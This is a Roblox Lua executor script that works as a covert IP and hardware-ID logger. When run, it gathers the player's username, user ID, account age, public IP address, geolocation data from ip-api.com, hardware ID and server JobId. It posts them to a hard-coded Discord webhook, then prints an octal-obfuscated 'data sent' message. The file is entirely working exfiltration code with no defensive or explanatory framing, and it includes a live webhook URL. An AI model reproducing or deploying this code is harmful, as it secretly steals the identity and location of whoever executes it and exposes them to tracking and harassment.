local LocalPlayer = game:GetService("Players").LocalPlayer
local DName = game.Players.LocalPlayer.DisplayName 
local Name = game.Players.LocalPlayer.Name
local Userid = game.Players.LocalPlayer.UserId
local Countury = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local webhookcheck = ""
local url = "https://discord.com/api/webhooks/1139974574524600387/dreHFK_vNGftwWEkcyiVTf_UCX5H10Ajco4AdyNMDLy8WHjDkNMuK4xmjp0mjEkzTc-U"
local data = {
   ["avatar_url"] = "https://imgur.com/sSOswzG",
   ["content"] = "",
   ["embeds"] = {
       {
     
      ["author"] = {
      ["name"] = "( Someone Executed The Script )",
      ["url"] = "https://roblox.com",
    },
        
           ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__".." **\nDisplay Name:** "..DName.." \n**Username:** " .. Name.." \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType.."\n**AccountAge:** "..AccountAge.."\n**Country:** "..game.LocalizationService.RobloxLocaleId.."**\nIP:** "..GetIp.."**\nHwid:** "..GetHwid.."**\nDate:** "..tostring(os.date("%m/%d/%Y")).."**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..GAMENAME.." \n**Game Id**: "..game.PlaceId.." \n**Synergy - Free:** "..webhookcheck.."".."\n\n**Data:**".."```"..GetData.."```".. "\n\n**JobId:**".."```"..ConsoleJobId.."```" ,
           ["type"] = "rich",
           ["color"] = tonumber(0xf2ff00),
   ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"},
            }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = syn and syn.request or request;
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
print("\100\097\116\097\032\115\101\110\116\040\112\097\115\115\041");
